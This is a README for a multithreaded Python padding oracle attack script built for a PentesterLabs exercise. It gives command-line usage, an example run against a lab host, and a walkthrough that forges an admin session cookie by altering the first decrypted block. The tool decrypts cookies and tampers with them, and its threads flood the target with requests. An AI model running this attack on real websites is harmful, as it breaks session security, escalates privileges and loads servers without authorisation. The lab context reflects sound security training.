# Fast-As-F*ck Padding Oracle Attack
This script was made for the [PentesterLabs Padding Oracle course](https://pentesterlab.com/exercises/padding_oracle) and served as my introduction into writting a script with python. This script  allows you to decode vulnerable data via a web based padding oracle attack, and also allows you to modify the cleartext content of the first block. This script also writes the decoded data to a file so there is some persistence for easier modification of the data. I have yet to test this anywhere else other than the Pentesterlabs course so the usage of this script may not be very high outside of its original purpose, but I have tried to add some variability to it. I only had about a months worth of experience with python when making this so the code is pretty sloppy, so if any refactoring or error fixes are welcome.

By making two modifications to my original padding oracle script, I was able to greatly increase the spead of the decoding process. The first thing I did was skip all the cleartext padding bytes, because if we decode from the end to the start, the first cleartext byte tells us how much padding it uses, and in turn, how many bytes we can skip. My second improvement was adding multithreading which surprisingly wasn't as difficult as I thought it would be. This improves time by dividing the guess work of the 256 characters, equally amongst all threads, where all threads can establish their own sessions with the website and flood it with requests all at the same time. 

Overall these two modifications made the script about 5x faster, going from about 10 minutes to decode 16 bytes, to less than 2 minutes using 6 threads.
<br></br>

## Usage

###### Decoding data
To will need to run the file with `python3`, and supply some data. Usage should be as follows:
```bash
python3 faf-padding-oracle.py -d "EncodedData" -u "url" -e "ErrorMessage" -c "CookieName" 
``` 

Here are some additional commands you can run:
```bash
optional arguments:
  -h, --help            show this help message and exit
  -r, --resume          Resume an attack from the /tmp/pad.json file
  -m, --modify          Modify some of the cleartext once everything has been decoded
  -d DATA, --data DATA  Cipher data to decrypt
  -u URL, --url URL     Victim website URL
  -b BLOCKSIZE, --blocksize BLOCKSIZE
                        The amount of bytes in each block (Default is 8)
  -e ERROR, --error ERROR
                        The error message that is displayed when there is incorrect padding (case sensitive)
  -c COOKIENAME, --cookiename COOKIENAME
                        The name of the cookie to submit with the data (Just the name)
  --encoding ENCODING   The encoding used by the victims site: [0] Base64 (default) [1] URL encoded
  -t THREADS, --threads THREADS
                        Number of threads to run during the attack (More threads == faster)
```

And here is an example of its usage:
```bash
python3 faf-padding-oracle.py -d "u7bvLewln6M9TnM411NAQqOlqvvLRQGd" -u "http://ptl-a3d6d67e-6bb65621.libcurl.so/" -e "Invalid padding" -c auth --encoding 0  -t 6
```

###### Modifying data
This script only allows you to modify the first block of plaintext data, as changing any other block would result in a different intermediary state to the one we have deciphered, and would require more web requests and a lot more complex code.

To modify the first block, all you need to do is run the script with the -m flag like so:
```bash
python3 faf-padding-oracle.py -m
```
Then you will be prompted to change the first block which you do by entering the exact amount of characters as the block size:
```bash
python3 faf-padding-oracle.py -m
[*] You can change 8 characters, in the first block.
[*] Current first block: user=ddm Please enter your changes: user=adm
[*] Your new string is: user=admin
[*] Here is your cookie: u7bvLewgn6M9TnM411NAQqOlqvvLRQGd
```
